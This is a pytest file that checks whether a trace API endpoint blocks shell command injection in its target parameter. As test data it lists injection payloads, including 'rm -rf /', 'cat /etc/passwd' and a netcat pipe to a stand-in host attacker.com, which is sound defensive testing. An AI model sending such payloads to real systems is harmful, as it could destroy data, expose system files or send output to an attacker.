import pytest
import subprocess
from unittest.mock import patch, MagicMock
from modules.Tracer.app.api.http_server import app


@pytest.mark.parametrize("payload", [
    "8.8.8.8",  # valid input
    "192.168.1.1; rm -rf /",  # command injection attempt
    "example.com && cat /etc/passwd",  # chained command injection
    "127.0.0.1`whoami`",  # command substitution injection
    "localhost | nc attacker.com 4444",  # pipe injection
])
def test_trace_endpoint_prevents_command_injection(payload):
    """Invariant: target parameter must not allow shell metacharacter execution in subprocess calls"""
    
    client = app.test_client()
    
    with patch('modules.Tracer.app.tracer_service.execute_trace') as mock_execute:
        mock_execute.return_value = {"status": "ok"}
        
        response = client.get(f'/api/trace?target={payload}')
        
        # Verify the endpoint was called
        assert response.status_code in [200, 400, 422]
        
        # If execute_trace was called, verify the target argument is properly escaped/validated
        if mock_execute.called:
            call_args = mock_execute.call_args
            target_arg = call_args[0][0] if call_args[0] else call_args[1].get('target')
            
            # Assert that shell metacharacters are not passed unescaped to subprocess
            dangerous_chars = [';', '|', '&', '`', '$', '(', ')', '<', '>', '\n']
            if any(char in payload for char in dangerous_chars):
                # If payload contains dangerous chars, they must be escaped or rejected
                assert target_arg != payload or not any(char in str(target_arg) for char in dangerous_chars), \
                    f"Dangerous characters in payload were not sanitized: {payload}"